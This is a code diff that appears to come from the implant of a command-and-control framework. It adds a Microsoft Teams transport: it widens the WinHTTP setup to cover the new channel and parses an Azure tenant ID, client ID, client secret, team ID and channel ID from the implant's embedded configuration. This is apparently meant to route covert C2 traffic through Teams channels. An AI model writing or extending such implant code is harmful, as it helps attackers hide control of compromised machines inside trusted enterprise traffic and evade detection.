@@ -59,7 +59,7 @@ declfn instance::instance(
         if ( bcrypt_mod.handle ) { RESOLVE_IMPORT( bcrypt_mod ); }
     }
 
-#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
+#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT ) || defined( MSTEAMS_TRANSPORT )
     {
         STK_WINHTTP(_n);
         winhttp.handle = reinterpret_cast<uintptr_t>(
@@ -77,7 +77,7 @@ declfn instance::instance(
     }
 #endif
 
-#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
+#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT ) || defined( MSTEAMS_TRANSPORT )
     h_session = nullptr;
     h_connect = nullptr;
 #endif
@@ -253,6 +253,25 @@ auto declfn instance::parse_config() -> bool {
 
         transport.server_issue = parser_int32( &p );
         transport.client_issue = parser_int32( &p );
+    }
+#endif
+
+#if defined( MSTEAMS_TRANSPORT )
+    {
+        auto tid = parser_string( &p, &slen );
+        if ( tid && slen > 0 ) { memory::copy( transport.msteams_tenant_id, tid, slen ); transport.msteams_tenant_id[slen] = '\0'; }
+
+        auto cid = parser_string( &p, &slen );
+        if ( cid && slen > 0 ) { memory::copy( transport.msteams_client_id, cid, slen ); transport.msteams_client_id[slen] = '\0'; }
+
+        auto csec = parser_string( &p, &slen );
+        if ( csec && slen > 0 ) { memory::copy( transport.msteams_client_secret, csec, slen ); transport.msteams_client_secret[slen] = '\0'; }
+
+        auto tmid = parser_string( &p, &slen );
+        if ( tmid && slen > 0 ) { memory::copy( transport.msteams_team_id, tmid, slen ); transport.msteams_team_id[slen] = '\0'; }
+
+        auto chid = parser_string( &p, &slen );
+        if ( chid && slen > 0 ) { memory::copy( transport.msteams_channel_id, chid, slen ); transport.msteams_channel_id[slen] = '\0'; }
     }
 #endif
 
